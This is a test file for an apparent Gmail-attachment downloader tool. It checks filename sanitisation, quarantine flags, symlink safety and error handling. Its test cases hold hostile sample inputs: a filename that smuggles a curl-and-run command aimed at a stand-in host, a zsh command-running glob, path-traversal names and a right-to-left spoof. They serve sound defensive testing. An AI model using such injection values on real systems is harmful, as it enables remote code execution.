import json
import os
import stat
import subprocess
import sys

import pytest

from gmail_attachments_mcp import files
from gmail_attachments_mcp.files import QuarantineError, attachment_name, is_quarantined
from gmail_attachments_mcp.gmail import (
    GmailError, NotFound, Part, _attachment_names, normalize_message_id,
)

from .conftest import CSV, CSV2, PDF, PNG

INVOICE = "1a0000000000000a"
MULTI = "1a0000000000000b"


def _read(entry):
    with open(entry["path"], "rb") as f:
        return f.read()


def test_download_by_part_id(downloader):
    result = downloader.download(INVOICE, "1")
    (att,) = result["attachments"]
    assert result["messageId"] == INVOICE
    assert att["filename"] == "invoice.pdf" and att["mimeType"] == "application/pdf"
    assert att["size"] == len(PDF) and _read(att) == PDF
    assert os.path.basename(att["path"]) == "part1.pdf"
    assert stat.S_IMODE(os.stat(att["path"]).st_mode) == 0o600
    assert stat.S_IMODE(os.stat(os.path.dirname(att["path"])).st_mode) == 0o700


@pytest.mark.parametrize(
    "filename, mime_type, expected",
    [
        ("invoice.pdf", "application/pdf", "part1.pdf"),
        ("Q3 Report.PDF", "application/pdf", "part1.pdf"),
        ("archive.tar.gz", "application/gzip", "part1.gz"),
        ("../../evil.sh", "text/plain", "part1.sh"),
        # The sender picks the name, so nothing of it but a plain extension reaches the path.
        ("$(curl -so x evil.example;sh x).pdf", "application/pdf", "part1.pdf"),
        # In zsh, an unquoted path ending in (e[cmd]) runs cmd.
        ("x.pdf(e[date])", "application/pdf", "part1.pdf"),
        # A right-to-left override would show this as "invoicegkp.pdf".
        ("invoice\u202efdp.pkg", "application/pdf", "part1.pkg"),
        ("notes", "text/plain", "part1.txt"),
        ("file.", "image/png", "part1.png"),
        ("x.extensiontoolong", "application/pdf", "part1.pdf"),
        (None, "application/x-unknown", "part1"),
    ],
)
def test_attachment_name(filename, mime_type, expected):
    assert attachment_name("part1", filename, mime_type) == expected


def test_unexpected_part_id_is_refused():
    with pytest.raises(GmailError, match="Unexpected partId"):
        _attachment_names([Part("../1", "x.pdf", "application/pdf", 1, None, "")])


@pytest.mark.skipif(sys.platform != "darwin", reason="quarantine is a macOS attribute")
def test_saved_file_is_quarantined_and_an_unmarked_copy_is_rewritten(downloader):
    def quarantined(path):
        fd = os.open(path, os.O_RDONLY)
        try:
            return is_quarantined(fd)
        finally:
            os.close(fd)

    (att,) = downloader.download(INVOICE, "1")["attachments"]
    assert quarantined(att["path"])
    # Files saved before quarantine was added get marked on the next request.
    subprocess.run(["xattr", "-d", "com.apple.quarantine", att["path"]], check=True)
    assert not quarantined(att["path"])
    downloader.download(INVOICE, "1")
    assert quarantined(att["path"]) and _read(att) == PDF


def test_download_by_id_from_an_earlier_connector_call(downloader, session):
    # Gmail rotates attachment IDs, so the connector's ID never matches a fresh fetch.
    stale = session.issue_id(INVOICE, "1")
    (att,) = downloader.download(INVOICE, stale)["attachments"]
    assert att["partId"] == "1" and _read(att) == PDF


def test_stale_id_for_one_of_several_same_size_parts_is_matched_by_content(downloader, session):
    assert len(CSV) == len(CSV2)
    stale = session.issue_id(MULTI, "2")
    (att,) = downloader.download(MULTI, stale)["attachments"]
    assert att["partId"] == "2" and _read(att) == CSV2


def test_download_all_attachments(downloader):
    atts = downloader.download(MULTI)["attachments"]
    assert [a["partId"] for a in atts] == ["1", "2", "3", "4"]
    assert [_read(a) for a in atts] == [CSV, CSV2, PNG, PDF]
    assert [os.path.basename(a["path"]) for a in atts] == [
        "part1.csv", "part2.csv", "part3.png", "part4.pdf"
    ]
    assert [a["filename"] for a in atts] == ["report.csv", "REPORT.csv", "logo.png", "part4.pdf"]


def test_index_lists_every_part_with_its_original_name(downloader):
    (att,) = downloader.download(MULTI, "3")["attachments"]
    with open(os.path.join(os.path.dirname(att["path"]), files.INDEX_NAME)) as f:
        assert json.load(f) == {
            "part1.csv": "report.csv", "part2.csv": "REPORT.csv", "part3.png": "logo.png",
            "part4.pdf": None,
        }


@pytest.mark.skipif(sys.platform != "darwin", reason="quarantine is a macOS attribute")
def test_unmarkable_file_is_not_saved(downloader, monkeypatch):
    class NoXattrs:
        fgetxattr = files._libc.fgetxattr

        @staticmethod
        def fsetxattr(*args):
            return -1

    monkeypatch.setattr(files, "_libc", NoXattrs)
    with pytest.raises(QuarantineError, match="--attachments-dir"):
        downloader.download(INVOICE, "1")
    msg_dir = os.path.join(os.path.realpath(downloader.attachments_dir), INVOICE)
    assert os.listdir(msg_dir) == []


def test_inline_attachment_data_needs_no_extra_fetch(downloader, session):
    downloader.download(MULTI, "3")
    assert not any("/attachments/" in url for url in session.calls)


def test_decimal_message_id_is_accepted(downloader):
    result = downloader.download(str(int(INVOICE, 16)), "1")
    assert result["messageId"] == INVOICE


def test_repeat_download_reuses_file(downloader):
    first = downloader.download(INVOICE, "1")["attachments"][0]
    mtime = os.stat(first["path"]).st_mtime_ns
    second = downloader.download(INVOICE, "1")["attachments"][0]
    assert second["path"] == first["path"] and os.stat(second["path"]).st_mtime_ns == mtime


def test_planted_symlink_is_replaced_not_followed(downloader, tmp_path):
    target = tmp_path / "victim.txt"
    target.write_bytes(b"keep me")
    msg_dir = os.path.join(os.path.realpath(downloader.attachments_dir), INVOICE)
    os.makedirs(msg_dir, mode=0o700)
    os.symlink(target, os.path.join(msg_dir, "part1.pdf"))
    (att,) = downloader.download(INVOICE, "1")["attachments"]
    assert target.read_bytes() == b"keep me"
    assert not os.path.islink(att["path"]) and _read(att) == PDF


@pytest.mark.parametrize(
    "message_id, attachment_id, error",
    [
        ("1a0000000000dead", None, "Message 1a0000000000dead not found"),
        ("1a0000000000000c", None, "has no attachments"),
        (INVOICE, "9", "parts with attachments: 1 (invoice.pdf)"),
        (INVOICE, "../../etc", "not found"),
        ("../profile", None, "Invalid message ID"),
    ],
)
def test_errors(downloader, message_id, attachment_id, error):
    with pytest.raises(NotFound, match=error.replace("(", r"\(").replace(")", r"\)")):
        downloader.download(message_id, attachment_id)


def test_normalize_message_id():
    assert normalize_message_id(" 1A0000000000000A ") == "1a0000000000000a"
    assert normalize_message_id("1873497444986126346") == "1a0000000000000a"
